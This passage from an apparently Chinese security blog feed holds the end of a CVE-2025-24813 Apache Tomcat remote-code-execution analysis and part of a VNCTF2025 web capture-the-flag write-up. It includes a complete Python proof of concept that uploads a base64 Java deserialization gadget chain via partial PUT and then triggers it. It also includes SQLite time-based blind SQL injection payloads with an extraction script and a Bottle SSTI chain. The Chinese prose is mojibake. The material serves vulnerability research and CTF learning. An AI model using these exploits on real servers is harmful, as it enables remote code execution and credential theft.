ois.close();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Throwable var18) &#123;</span><br><span class="line">                            var19.addSuppressed(var18);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">throw</span> var19;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (ois != <span class="literal">null</span>) &#123;</span><br><span class="line">                    ois.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var20) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fis.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable var17) &#123;</span><br><span class="line">                    var20.addSuppressed(var17);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">throw</span> var20;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            fis.close();</span><br><span class="line">            <span class="keyword">return</span> var9;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException var21) &#123;</span><br><span class="line">            <span class="keyword">if</span> (contextLog.isDebugEnabled()) &#123;</span><br><span class="line">                contextLog.debug(sm.getString(<span class="string">&quot;fileStore.noFile&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;id, file.getAbsolutePath()&#125;));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ois = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            context.unbind(Globals.IS_SECURITY_ENABLED, oldThreadContextCL);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ois;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆè·Ÿè¿›ä¸€ä¸‹File file &#x3D; this.file(id);</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> File <span class="title function_">file</span><span class="params">(String id)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">       <span class="type">File</span> <span class="variable">storageDir</span> <span class="operator">=</span> <span class="built_in">this</span>.directory();</span><br><span class="line">       <span class="keyword">if</span> (storageDir == <span class="literal">null</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> id + <span class="string">&quot;.session&quot;</span>;</span><br><span class="line">           <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(storageDir, filename);</span><br><span class="line">           <span class="type">File</span> <span class="variable">canonicalFile</span> <span class="operator">=</span> file.getCanonicalFile();</span><br><span class="line">           <span class="keyword">if</span> (!canonicalFile.toPath().startsWith(storageDir.getCanonicalFile().toPath())) &#123;</span><br><span class="line">               log.warn(sm.getString(<span class="string">&quot;fileStore.invalid&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;file.getPath(), id&#125;));</span><br><span class="line">               <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">return</span> canonicalFile;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå·²ç»ä¿®å¤äº†å½“æ—¶çš„ç›®å½•ç©¿è¶Šé—®é¢˜å¯¼è‡´çš„ååºåˆ—åŒ–ï¼Œä¿®å¤â½…å¼å°±æ˜¯getCanonicalFileå¤„ç†ç©¿è¶Šé—®é¢˜ã€‚</p><p>å› æ­¤ç°åœ¨åªèƒ½åŠ è½½ç¼“å­˜ç›®å½•ä¸‹çš„id + â€œ.sessionâ€æ–‡ä»¶å¹¶å°†å…¶ååºåˆ—åŒ–ï¼Œååºåˆ—åŒ–çš„è§¦å‘ç‚¹ä¾æ—§æ˜¯å­˜åœ¨çš„ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1  </span><br><span class="line">Host: localhost:8080  </span><br><span class="line">Cookie: JSESSIONID=.aaa</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å‘è¿™ä¸ªè§¦å‘åŒ…è°ƒè¯•ä¸€ä¸‹çœ‹çœ‹</p><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250321181300810.png" class="" title="This is an example image"><p>æ¥ç€æˆ‘ä»¬æ¢å¤ç¨‹åºï¼Œå‘ç°æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ï¼</p><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250321181341232.png" class="" title="This is an example image"><p>å¤ç°å®Œæˆï¼æ¥ä¸‹æ¥ç»™å‡ºå¤§bå“¥ç»™å‡ºçš„POCï¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Author: @Boogipop </span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"><span class="keyword">import</span> base64 </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">put_request</span>(<span class="params">url, data=<span class="literal">None</span>, headers=<span class="literal">None</span>, timeout=<span class="number">10</span>, verify=<span class="literal">True</span></span>): </span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line">response = requests.put( </span><br><span class="line">url=url, </span><br><span class="line">data=data, </span><br><span class="line">headers=headers, </span><br><span class="line">timeout=timeout, </span><br><span class="line">      verify=verify </span><br><span class="line">) </span><br><span class="line"><span class="keyword">return</span> response </span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e: </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;PUTè¯·æ±‚å‘â½£é”™è¯¯: <span class="subst">&#123;e&#125;</span>&quot;</span>) </span><br><span class="line"><span class="keyword">return</span> <span class="literal">None</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_request</span>(<span class="params">url, headers=<span class="literal">None</span>, timeout=<span class="number">10</span>, verify=<span class="literal">True</span></span>): </span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line">response = requests.get( </span><br><span class="line">url=url, </span><br><span class="line">headers=headers, </span><br><span class="line">timeout=timeout, </span><br><span class="line">verify=verify </span><br><span class="line">) </span><br><span class="line"><span class="keyword">return</span> response </span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e: </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;GETè¯·æ±‚å‘â½£é”™è¯¯: <span class="subst">&#123;e&#125;</span>&quot;</span>) </span><br><span class="line"><span class="keyword">return</span> <span class="literal">None</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>: </span><br><span class="line">target_url = <span class="string">&quot;http://127.0.0.1:8080/a/session&quot;</span> </span><br><span class="line">payload =</span><br><span class="line">base64.b64decode(<span class="string">&quot;rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8</span></span><br><span class="line"><span class="string">Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEA</span></span><br><span class="line"><span class="string">DWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY</span></span><br><span class="line"><span class="string">3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB+AABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbu</span></span><br><span class="line"><span class="string">WUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmc</span></span><br><span class="line"><span class="string">uYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNm</span></span><br><span class="line"><span class="string">b3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvb</span></span><br><span class="line"><span class="string">W1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAARzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3</span></span><br><span class="line"><span class="string">Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN</span></span><br><span class="line"><span class="string">0O3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVu</span></span><br><span class="line"><span class="string">Y3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kT</span></span><br><span class="line"><span class="string">mFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbm</span></span><br><span class="line"><span class="string">cuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXB0AAlnZXRNZXRob2R1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxb</span></span><br><span class="line"><span class="string">XrsvNWpkCAAB4cAAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+AB9zcQB+ABZ1cQB+ABsAAAACcHB0AAZp</span></span><br><span class="line"><span class="string">bnZva2V1cQB+AB8AAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAbc3EAfgAWdXEAfgAbAAAAAXQAEk9wZ</span></span><br><span class="line"><span class="string">W4gLWEgQ2FsY3VsYXRvcnQABGV4ZWN1cQB+AB8AAAABcQB+ACJzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYW</span></span><br><span class="line"><span class="string">RGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4dnIAEmphdmEubGFuZy5PdmVycmlkZQAAAAAAAAAAAAAAeHB</span></span><br><span class="line"><span class="string">xAH4AMw==&quot;</span>) </span><br><span class="line">range_len = <span class="built_in">len</span>(payload) </span><br><span class="line">custom_headers = &#123; </span><br><span class="line"><span class="string">&quot;Content-Range&quot;</span>: <span class="string">f&quot;bytes 0-<span class="subst">&#123;range_len+<span class="number">1</span>&#125;</span>/1200&quot;</span> </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">response = put_request(url=target_url, data=payload, headers=custom_headers) </span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">409</span>: </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] â½‚ä»¶ä¸Šä¼ æˆåŠŸ&quot;</span>) </span><br><span class="line"> </span><br><span class="line">triggle_url = <span class="string">&quot;http://127.0.0.1:8080/&quot;</span> </span><br><span class="line">get_headers = &#123; </span><br><span class="line"><span class="string">&quot;JSESSIONID&quot;</span>:<span class="string">&quot;.a&quot;</span> </span><br><span class="line">&#125; </span><br><span class="line">get_response = get_request(url=triggle_url,headers=get_headers) </span><br><span class="line"><span class="keyword">if</span> get_response: </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] è§¦å‘ Payload&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CVEå¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVEå¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF2025-Web-wp</title>
      <link href="/2025/02/16/VNCTF2025-Web-wp/"/>
      <url>/2025/02/16/VNCTF2025-Web-wp/</url>
      
        <content type="html"><![CDATA[<h2 id="å¥¶é¾™å›å®¶"><a href="#å¥¶é¾™å›å®¶" class="headerlink" title="å¥¶é¾™å›å®¶"></a>å¥¶é¾™å›å®¶</h2><p>å°±ä¸€ä¸ªç™»å½•æ¡†ã€‚ã€‚å°è¯•sqlæ³¨å…¥</p><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215151012213.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>å›æ˜¾å‘ç”Ÿäº†æŸç§é”™è¯¯ï¼Ÿï¼Ÿå®é”¤sqlæ³¨å…¥</p><p>bp fuzzä¸€ä¸‹çœ‹çœ‹è¿‡æ»¤</p><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215152313743.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>è¿‡æ»¤äº†&#x3D; sleep union lengthç­‰ç­‰</p><p>å…ˆéšä¾¿æµ‹æµ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;123&#x27;/**/or/**/&#x27;1&#x27;&lt;&#x27;2&quot;,&quot;password&quot;:&quot;123&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;123&#x27;/**/or/**/1&lt;2/*&quot;,&quot;password&quot;:&quot;123&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;123&#x27;/**/or/**/1&lt;2--&quot;,&quot;password&quot;:&quot;123&quot;&#125;</span><br></pre></td></tr></table></figure><p>éƒ½æ˜¯å›æ˜¾è´¦å·æˆ–å¯†ç é”™è¯¯ï¼Œè¿‡æ»¤æŒºå¤šï¼Œæ„Ÿè§‰åªèƒ½ç›²æ³¨äº†ã€‚è¯•äº†åŠå¤©çš„database()ä¸è¡Œã€‚ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;123&#x27;/**/or/**/substr(sqlite_version(),1,1)&gt;&#x27;0&#x27;--&quot;,&quot;password&quot;:&quot;123&quot;&#125;</span><br></pre></td></tr></table></figure><p>å›æ˜¾è´¦å·æˆ–å¯†ç é”™è¯¯ï¼Œæ­£å¸¸äº†ï¼è¯´æ˜æ•°æ®åº“ä¸ºsqliteï¼Œsqliteæ²¡æœ‰sleepå‡½æ•°ï¼Œä½†æ˜¯æœ‰randomblobå‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;123&#x27;/**/or/**/(case/**/when/**/(substr(sqlite_version(),1,1)&gt;&#x27;0&#x27;)/**/then/**/randomblob(1000000000)/**/else/**/0/**/end)--&quot;,&quot;password&quot;:&quot;123&quot;&#125;</span><br></pre></td></tr></table></figure><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215153953719.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>å‡ºç°æ˜æ˜¾çš„æ—¶é—´å»¶è¿Ÿã€‚å¯ä»¥é‡‡ç”¨æ—¶é—´ç›²æ³¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;http://node.vnteam.cn:47824/login&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid = (low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        <span class="comment">#payload = &quot;-1&#x27;/**/or/**/(case/**/when(substr((select/**/name/**/from/**/sqlite_master/**/where/**/type&lt;&#x27;zable&#x27;),&#123;0&#125;,1)&gt;&#x27;&#123;1&#125;&#x27;)/**/then/**/randomblob(500000000)/**/else/**/0/**/end)/*&quot;.format(i,chr(mid))</span></span><br><span class="line">        <span class="comment">#payload = &quot;-1&#x27;/**/or/**/(case/**/when(substr((select/**/hex(group_concat(sql))/**/from/**/sqlite_master/**/where/**/type/**/like/**/&#x27;table&#x27;/**/and/**/name/**/like/**/&#x27;users&#x27;),&#123;0&#125;,1)&gt;&#x27;&#123;1&#125;&#x27;)/**/then/**/randomblob(500000000)/**/else/**/0/**/end)/*&quot;.format(i,chr(mid))</span></span><br><span class="line">        payload = <span class="string">&quot;-1&#x27;/**/or/**/(case/**/when(substr((select/**/group_concat(password)from/**/users),&#123;0&#125;,1)&gt;&#x27;&#123;1&#125;&#x27;)/**/then/**/randomblob(500000000)/**/else/**/0/**/end)/*&quot;</span>.<span class="built_in">format</span>(i,<span class="built_in">chr</span>(mid))</span><br><span class="line">        datas = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="string">&#x27;123&#x27;</span></span><br><span class="line">     &#125;</span><br><span class="line">        start_time=time.time()</span><br><span class="line">        res = requests.post(url=url,json=datas)</span><br><span class="line">        end_time=time.time()</span><br><span class="line">        spend_time=end_time-start_time</span><br><span class="line">        <span class="keyword">if</span> spend_time&gt;=<span class="number">1</span>:</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span>(mid ==<span class="number">32</span> <span class="keyword">or</span> mid ==<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&#x27;\n&#x27;+bytes.fromhex(flag).decode(&#x27;utf-8&#x27;))</span></span><br></pre></td></tr></table></figure><p>ä¾æ¬¡çˆ†å‡ºusernameå’Œpassword</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: nailong</span><br><span class="line">password: woaipangmao114514</span><br></pre></td></tr></table></figure><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215170055294.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><h2 id="å­¦ç”Ÿå§“åç™»è®°ç³»ç»Ÿ"><a href="#å­¦ç”Ÿå§“åç™»è®°ç³»ç»Ÿ" class="headerlink" title="å­¦ç”Ÿå§“åç™»è®°ç³»ç»Ÿ"></a>å­¦ç”Ÿå§“åç™»è®°ç³»ç»Ÿ</h2><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215170412217.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>å•æ–‡ä»¶æ¡†æ¶ï¼Ÿè°·æ­Œæœç´¢ä¸€ä¸‹å¾—çŸ¥ä¸ºbottleæ¡†æ¶ï¼Œæ¯”è¾ƒå†·é—¨ï¼Œæˆ‘ä»¬çœ‹çœ‹å®˜æ–¹æ‰‹å†Œï¼š<a href="https://www.osgeo.cn/bottle/">https://www.osgeo.cn/bottle/</a></p><p>å®ƒçš„æ¨¡æ¿å¼•æ“å«SimpleTemplateï¼Œè€ƒå¯Ÿçš„ä¼°è®¡å°±æ˜¯sstiäº†</p><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215174546841.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>æµ‹çš„æ—¶å€™æˆ‘ä»¬å‘ç°å•è¡Œæœ€é•¿23å­—ç¬¦ï¼Œä¸ç„¶ä¼šæŠ¥é”™ï¼ŒåŒæ—¶æˆ‘ä»¬å‘ç°pythonç‰ˆæœ¬ä¸º3.12.xï¼Œpython3.8ä»¥åå‡ºç°äº†æµ·è±¡è¿ç®—ç¬¦ï¼Œå¯ä»¥è¿›è¡Œæ‹¼æ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;a:=&#x27;&#x27;.__class__&#125;&#125;</span><br><span class="line">&#123;&#123;b:=a.__base__&#125;&#125;</span><br><span class="line">&#123;&#123;c:=b.__subclasses__&#125;&#125;</span><br><span class="line">&#123;&#123;d:=c()[154]&#125;&#125;</span><br><span class="line">&#123;&#123;e:=d.__init__&#125;&#125;</span><br><span class="line">&#123;&#123;f:=e.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥åœ¨__globals__ä¸­æ‰¾åˆ°äº†flag</p><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215175408704.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><h2 id="Gin"><a href="#Gin" class="headerlink" title="Gin"></a>Gin</h2><p>ä¸€é“goçš„ç™½ç›’å®¡è®¡</p><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215180048030.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>çœ‹åˆ°è¿™é‡Œï¼Œå¯ä»¥çŒœæƒ³ä¸€ä¸‹å¤§è‡´æ€è·¯ï¼Œå­˜åœ¨adminç”¨æˆ·å’Œuserç”¨æˆ·ï¼Œuserç”¨æˆ·å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œadminç”¨æˆ·å¯ä»¥evalæ‰§è¡Œå‘½ä»¤ã€‚åŒæ—¶å­˜åœ¨jwté‰´æƒï¼Œé‚£è‚¯å®šä¸jwtæœ‰å…³äº†å˜›</p><p>ç„¶åçœ‹ä¸€ä¸‹evalè·¯ç”±æ˜¯æ€ä¹ˆæ‰§è¡Œå‘½ä»¤çš„ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Eval</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">code := c.PostForm(<span class="string">&quot;code&quot;</span>)</span><br><span class="line">log.Println(code)</span><br><span class="line"><span class="keyword">if</span> code == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">response.Response(c, http.StatusBadRequest, <span class="number">400</span>, <span class="literal">nil</span>, <span class="string">&quot;No code provided&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">log.Println(containsBannedPackages(code))</span><br><span class="line"><span class="keyword">if</span> containsBannedPackages(code) &#123;</span><br><span class="line">response.Response(c, http.StatusBadRequest, <span class="number">400</span>, <span class="literal">nil</span>, <span class="string">&quot;Code contains banned packages&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">tmpFile, err := ioutil.TempFile(<span class="string">&quot;&quot;</span>, <span class="string">&quot;goeval-*.go&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">&quot;Error creating temp file:&quot;</span>, err)</span><br><span class="line">response.Response(c, http.StatusInternalServerError, <span class="number">500</span>, <span class="literal">nil</span>, <span class="string">&quot;Error creating temporary file&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> os.Remove(tmpFile.Name())</span><br><span class="line"></span><br><span class="line">_, err = tmpFile.WriteString(code)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">&quot;Error writing code to temp file:&quot;</span>, err)</span><br><span class="line">response.Response(c, http.StatusInternalServerError, <span class="number">500</span>, <span class="literal">nil</span>, <span class="string">&quot;Error writing code to temp file&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cmd := exec.Command(<span class="string">&quot;go&quot;</span>, <span class="string">&quot;run&quot;</span>, tmpFile.Name())</span><br><span class="line">output, err := cmd.CombinedOutput()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">&quot;Error running Go code:&quot;</span>, err)</span><br><span class="line">response.Response(c, http.StatusInternalServerError, <span class="number">500</span>, gin.H&#123;<span class="string">&quot;error&quot;</span>: <span class="type">string</span>(output)&#125;, <span class="string">&quot;Error executing code&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response.Success(c, gin.H&#123;<span class="string">&quot;result&quot;</span>: <span class="type">string</span>(output)&#125;, <span class="string">&quot;success&quot;</span>)</span><br><span 